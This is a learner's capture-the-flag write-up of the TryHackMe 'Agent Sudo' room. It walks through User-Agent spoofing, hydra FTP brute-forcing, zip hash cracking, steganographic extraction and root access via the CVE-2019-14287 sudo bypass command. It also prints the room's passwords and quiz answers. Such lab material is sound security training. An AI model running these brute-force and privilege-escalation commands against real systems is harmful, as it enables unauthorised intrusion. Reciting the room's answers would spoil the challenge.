# Agent Sudo

# CTF write-up

- **Platform** : **TryHackMe**
- **Name** : **Agent Sudo**
- **Category** : **Web, FTP bruteforcing, Hash Cracking, SSH, Privilege escalation**
- **Difficulty** : **Easy**
- **Completed Date** : **26.10.2026**

## Objective

- The goal is to find user flag and root flag ,and answer the quizs during the process.

## Actions

## step 1

I first nmap the target machine.

'''bash: nmap -sV -F -T4 <TARGET_IP>'''

**Findings**

I find 3 ports open, ssh, ftp and http.

## step 2

I go and check the http site.

=> http://<TARGET_IP>

**Findings**

It says

"Dear agents,

Use your own codename as user-agent to access the site.

From,

Agent R"

**Analysis**

The website is telling about using agent code name as user-agent to access.

So , For the answer of "How you redirect yourself to a secret page?" might be "user-agent".

## step 3

Since we don't know the agent code, we gonna try access to the site as Agent R.

I open burpsuite, open chromium in burp and set the intercept on.

Then I open the site in chromium,

=> http://<TARGET_IP>

OK, I get the GET traffic in proxy , so I send it to repeater to edit it.

In line 5, I set "User-Agent : R" and click send.

**Findings**

I get a new response from the site.

"What are you doing! Are you one of 25 employees?

If not I going to report this incident"

**Analysis**

I know that there are 25 employees, so there must be agent A, agent B and all the way to agent Z.

But the catch is there is only 25 employees and there are 26 letters in alphabet.

SO agent of one letter doesn't exit.

## step 4

Let's try every letter in "User-Agent : " place.

In case of agent C, the website has a redirection.

SO I click the redirection . In new directory , it says

"Attention Chris,

Do you still remember our deal? Please tell agent-J about the stuff ASAP.
Change your god damn password, is weak!"

**Findings**

Due to this directory, the answer of

"What is the agent name?" is "chris".

**Analysis**

We can see that chris's password is weak, so we can use brutefrocing for further exploitaion.

## step 5

So I gonna use hydra to bruteforce ftp login, with the name 'chris'.

'''bash:
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://<TARGET_IP>
'''

I get the ftp password for chirs, it is 'crystal'.

Let's login to ftp as chris,

'''bash: ftp <TARGET_IP>'''

Then add 'chris' for username and 'crystal' for password.

**Findings**

Now I am in ftp server. I type

'''bash: ls'''

and see 'To_agentJ.txt' , image file and jpg file. I download it to my device

'''bash: get To_agentJ.txt'''

Without exiting the ftp server tab, open new terminal tab and cat the text file we just downloaded

'''bash: cat To_agentJ.txt''

The text file says that agentR stored the real picture in agentJ's directory, and
agentJ login password is stored in the fake picture.

**Analysis**

Let's check the pictures from ftp server, since we can get more information form them.

## step 6

I download the two files and view them in the normal image viewer.

They are just normal images in image viewer.

Now let's cat the first image.

'''bash: cat cutie.png'''

It is a bunch of unreadable hash but at the bottom, we can see "To_agentR.txt".

So let's extract it using binwalk.

'''bash: binwalk -e cutie.png'''

Then

'''bash: ls'''

and we can see new zip file named "8702.zip" .

We can use many tools but here I use zip2john to crack the hash and add that in name.txt.

'''bash: zip2john 8702.zip > name.txt'''

**Findings**

Then we can type

'''bash: ls'''

and I can see name.txt.Right now, it is still a unreadable text file.

so Let's turn that into readable text.

'''bash: john name.txt'''

OKAY,  I got the password.

The password of zip file is "alien".

## step 7

Then I type

'''bash: 7z e 8702.zip'''

and enter "alien" for password.

Then

'''bash: ls'''

and I see "To_agentR.txt". I cat it

'''bash: cat To_agentR.txt'''

**Findings**


The text file says

"Agent C

We need to send the picture to 'QXJlYTUx' as soon as possible!

By

Agent R."

We can decrypt that on cyberchef.com but here I gonna use echo.


'''bash: echo 'QXJlYTUx' | base64 -d'''

The result is "Area51".

**Analysis**

I get so many information form one image, so let's investigate other image.

## step 8

I type

'''bash: steghide extract -sf cute_alien.jpg'''

It ask for passphrase, so I add "Area51" and I get a new text file named "message.txt".

'''bash: cat message.txt'''

**Findings**

And I get the login password for 'james', it is 'hackerrules!'.

For the question, the other agent is 'james' and SSH password is 'hackerrules!'.

## step 9

Now let's login to SSH as james and hackerrules! for password.

'''bash: ssh james@<TARGET_IP>'''

Ok, I am in james account , now let's search user flag.

'''bash: ls'''

'''bash: cat user_flag.txt'''

and I obtain the user flag.

**Findings and Analysis**

Aside from user flag, I aslo see the image file.

So I gonna download it to my device.


## step 10

I host the python server in james machine

'''bash: python3 -m http.server'''

The python server is host on port 8000 of http site.

And form my machine I open firefox and search

=> http://<TARGET_IP>:8000

I check the Alien_autospy.jpg and save it my machine.

**Findings and Analysis**

I open google image search and search Alien_autospy.jpg.

The information I get is that

"The photo is from 1995 'alien autopsy' video,
the footage was to show medical examination of extraterrestrial body reserved from 1947
'Roswell UFO incident' in New Mexico."

SO for the Question "What is the incident of the photo called?",

The answer is "Roswell alien autopsy".

## step 11

Now for the root flag, we need root privilege.

For root privilege, we need root password.

Let's check by typing

'''bash: sudo -l'''

and add 'hackerrules!' for password.

OK , at the result , it shows

=> (ALL, !root) /bin/bash


Let's copy and search that in exploit-db.com .

**Findings and Analysis**

The result says its CVE is 'CVE-2019-14287',

And can be exploit by typing

'''bash: sudo -u#-1 /bin/bash'''

## step 12

Now type that expoit bash in the terminal.

OKAYY, I get the root , now I just have to find root flag.

'''bash: cd ../../../'''

'''bash: cd root'''

'''bash: ls '''

and we can see root.txt .Then cat it

'''bash: cat root.txt'''

**Findings and Analysis**

I get the root flag and at the bottom, I can see

'DesKel a.k.a Agent R'

So the answer of Bonus question,"Who is Agent R?", is 'DesKel'.

## Challenge completed

## RealWorld Security Impact

We shouldn't use weak password on important account and information transfer.
